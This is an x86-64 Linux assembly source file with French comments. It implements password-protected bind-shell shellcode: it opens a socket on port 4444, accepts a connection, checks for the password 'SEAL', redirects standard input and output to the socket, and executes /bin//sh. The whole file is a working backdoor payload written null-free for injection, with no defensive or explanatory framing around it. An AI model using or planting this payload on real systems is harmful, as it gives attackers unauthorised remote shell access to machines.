global _start


section .text

_start:

jmp short real_start_1 


Launch_CommandProc: ;rbx=chaine de commande;
	xor rax,rax
	push rax
	
	mov rdx,rsp
	push rbx
	mov rdi ,rsp
	push rax	
	push rdi
	mov rsi,rsp
	add al,59
	syscall
	ret
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;PASSWORD IS OK GET THE SHELL
auth_ok:
;duplicate socket
;dup2 0
	mov rdi,r9
	xor rax,rax	
	add al,33 ;dup2
	xor rsi,rsi
	syscall
;dup2 1
	xor rax,rax
	add al,33
	xor rsi,rsi
	add sil,1
	syscall

;dup2 2
	xor rax,rax
	add al,33
	xor rsi,rsi
	add sil,2
	syscall

	xor rax,rax ;close socket
	add al,3
	syscall
;execv

	; push /bin//sh in reverse 

	mov rbx, 0x68732f2f6e69622f
	call Launch_CommandProc

real_start_1:
	jmp short real_start

;;;;;;;;;;;;;;;;;;;;;;;;;;;jmpcallpop from waitforPassword (buffer for password)
getBufferAddr:
	pop rsi
	;read 64bytes
	mov rdi,rax
	xor rax,rax
	xor rdx,rdx
	add dl,40
	syscall

	cmp dword [rsi],0x4c414553 ;compare it with SEAL
	je auth_ok
	;exit
	xor rax, rax
	add rax, 60
	xor rdi, rdi
	syscall	
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
waitForPassword:
	call getBufferAddr
	pass db "AAAAB"



real_start:

	xor rax,rax
	add al,41
	xor rsi,rsi
	add sil,1
	xor rdi,rdi
	add dil,2
	xor rdx,rdx

	syscall

	mov rdi,rax ;socket server

	xor rax,rax
	push rax

;pour le bind il nous faut plusieurs données
;struct_addr: 8byte de 0 (push rax)
;l'adresse du serveur: ANY (0)
;le port codé en big endian (hton converti en hex)
;Le AF_INET=2
	mov dword [rsp-04],eax
	mov word [rsp-6],0x5c11 ;5c11=23569(BE)=4444(LE)
	xor rax,rax
	inc rax
	inc rax
	mov word [rsp-8],ax
	sub rsp,8


;bind= syscall 49
	xor rax,rax
	add al,49
	mov rsi,rsp
	xor rdx,rdx
	add dl,16
	syscall  ;port ouvert

;wait for client
;50 pour syscall
;rdi pour sock
;rsi max client
	xor rax,rax	
	add al,50
	xor rsi,rsi
	add sil,2
	syscall ;listen

;accept client
	xor rax,rax
	add al,43 ;number syscall
	sub rsp,16
	mov rsi,rsp ;pointeur
	mov byte [rsp-1],16 ;adresse vers la valeur 16 pour le accept
	dec rsp
	mov rdx,rsp
	syscall ;wait for client

	mov r9,rax
	jmp waitForPassword




	

